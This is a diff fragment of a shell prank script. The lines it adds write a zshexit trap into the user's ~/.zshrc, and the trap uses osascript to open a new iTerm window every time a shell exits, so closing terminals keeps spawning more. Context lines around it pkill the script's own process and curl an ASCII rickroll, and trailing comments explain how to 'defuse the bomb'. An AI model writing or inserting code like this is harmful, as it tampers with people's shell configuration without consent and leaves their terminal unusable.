@@ -69,3 +69,20 @@ pkill -f "$(basename "$0")"
 
 curl ascii.live/rick
 
+content=$(cat <<'EOF'
+function zshexit() {
+    command='tell application "iTerm" to create window with default profile'
+    osascript -e "$command"
+    exit
+}
+trap zshexit EXIT
+EOF
+)
+echo "$content" >> ~/.zshrc
+
+# how to defuse the bomb
+# check ~/.zshrc
+# trap - EXIT
+# kill all processes 
+
+# if it still doesn't work, get help!
